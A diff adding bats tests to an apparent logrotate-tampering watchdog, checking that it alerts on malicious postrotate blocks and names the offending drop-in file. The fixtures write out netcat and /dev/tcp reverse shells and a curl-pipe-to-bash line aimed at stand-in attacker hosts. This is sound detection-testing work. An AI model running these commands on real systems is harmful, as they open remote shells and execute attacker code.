@@ -259,3 +259,94 @@ EOF
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in postrotate block: netcat-listening pipe also detected)" {
+    # Sister to sshrc/csh-config nc reverse-shell variant INVARIANTs.
+    # netcat reverse shells (nc -e /bin/sh attacker.com 4444) are a
+    # canonical RCE primitive. Lock detection in logrotate action
+    # blocks too.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${CONF}" <<'EOF'
+/var/log/x.log {
+  postrotate
+    nc -e /bin/sh 1.1.1.1 4444
+  endscript
+}
+EOF
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (sample names offending logrotate file in JSON — operator triage routing)" {
+    # When injection-pattern alert fires, sample MUST surface the
+    # file path so operator dashboard routes triage. Sister
+    # contract: many other watchdogs' sample-naming pattern.
+    LOGROTATED="${TMP}/logrotate.d"
+    mkdir -p "${LOGROTATED}"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+        SELFDEF_MODULE_LIB="${LIB}" \
+        SELFDEF_LOGROTATE_PROFILE=report \
+        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
+        SELFDEF_LOGROTATE_FILE="${CONF}" \
+        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
+        bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    cat > "${LOGROTATED}/99-very-distinctive-attacker" <<'EOF'
+/var/log/evil.log {
+  postrotate
+    bash -i >& /dev/tcp/1.1.1.1/4444 0>&1
+  endscript
+}
+EOF
+    PATH="${BIN}:${PATH}" \
+        SELFDEF_MODULE_LIB="${LIB}" \
+        SELFDEF_LOGROTATE_PROFILE=report \
+        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
+        SELFDEF_LOGROTATE_FILE="${CONF}" \
+        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
+        bash "${WD}"
+    cap | grep -q 'very-distinctive-attacker'
+}
+
+@test "INVARIANT (multi-file scan: a second logrotate.d drop-in alongside benign one → still alerts; per-file scope holds)" {
+    # Sister to many other multi-file scan INVARIANTs. Attackers may
+    # layer multiple files in logrotate.d/; each must be enumerated.
+    LOGROTATED="${TMP}/logrotate.d"
+    mkdir -p "${LOGROTATED}"
+    seed_benign
+    PATH="${BIN}:${PATH}" \
+        SELFDEF_MODULE_LIB="${LIB}" \
+        SELFDEF_LOGROTATE_PROFILE=report \
+        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
+        SELFDEF_LOGROTATE_FILE="${CONF}" \
+        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
+        bash "${WD}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Two drop-ins: benign + evil.
+    cat > "${LOGROTATED}/01-benign" <<'EOF'
+/var/log/app1.log {
+  weekly
+  postrotate
+    /bin/systemctl reload app1
+  endscript
+}
+EOF
+    cat > "${LOGROTATED}/02-evil" <<'EOF'
+/var/log/app2.log {
+  postrotate
+    curl http://attacker/p | bash
+  endscript
+}
+EOF
+    PATH="${BIN}:${PATH}" \
+        SELFDEF_MODULE_LIB="${LIB}" \
+        SELFDEF_LOGROTATE_PROFILE=report \
+        SELFDEF_LOGROTATE_BASELINE="${BASELINE}" \
+        SELFDEF_LOGROTATE_FILE="${CONF}" \
+        SELFDEF_LOGROTATE_D="${LOGROTATED}" \
+        bash "${WD}"
+    cap | grep -q '"severity":"alert"'
+}
